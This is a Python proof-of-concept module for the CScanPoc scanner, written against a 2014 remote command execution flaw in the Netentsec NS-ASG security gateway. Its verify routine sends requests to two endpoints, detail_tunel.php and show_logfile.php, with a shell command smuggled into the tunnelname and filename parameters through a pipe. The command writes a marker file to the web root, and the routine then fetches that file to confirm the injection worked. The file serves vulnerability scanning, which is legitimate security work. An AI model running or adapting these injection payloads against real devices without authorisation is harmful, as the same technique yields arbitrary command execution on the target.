# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Netentsec_0013'  # 平台漏洞编号，留空
    name = '网康NS-ASG 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-04-30'  # 漏洞公布时间
    desc = '''
        网康 NS-ASG 应用安全网关多处命令执行：
        /admin/detail_tunel.php?type=
        /debug/show_logfile.php?filename=
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=058987'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '网康应用安全网关'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2d04823b-d08b-4265-9fc9-c967aa896da0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2014-058987
            hh = hackhttp.hackhttp()
            arg = self.target
            payloads = [
                arg + '/admin/detail_tunel.php?type=ikev1&tunnelname=a%20|%20echo%20testvul0>/Isc/third-party/httpd/htdocs/test.txt',
                arg + '/debug/show_logfile.php?filename=a|echo%20testvul1>/Isc/third-party/httpd/htdocs/test.txt'
            ]
            for i in range(len(payloads)):
                payload = payloads[i]
                code, head, res, err, _ = hh.http(payload)
                if code != 0:
                    verify = arg + '/test.txt'
                    code, head, res, err, _ = hh.http(verify)
                    # print res
                    if code == 200 and ('testvul'+str(i)) in res:
                        #security_hole('command execution: ' + payload)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
